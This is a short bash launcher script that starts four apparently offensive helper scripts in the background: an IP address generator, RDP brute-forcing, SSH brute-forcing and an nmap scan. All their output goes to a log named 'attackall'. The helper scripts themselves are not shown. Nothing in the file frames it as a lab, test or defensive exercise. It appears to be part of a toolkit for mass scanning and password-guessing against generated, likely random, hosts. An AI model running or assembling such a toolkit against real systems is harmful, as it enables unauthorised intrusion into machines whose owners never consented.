#!/bin/bash
echo "Running IP Generator"
sh ./ip-generator.sh >> /var/log/attackall &

echo "Running RDP Bruteforce"
sh ./bruteforce-rdp.sh >> /var/log/attackall &

echo "Running SSH Bruteforce"
sh ./bruteforce-ssh.sh >> /var/log/attackall &

echo "Running NMAP"
sh ./nmap.sh >> /var/log/attackall &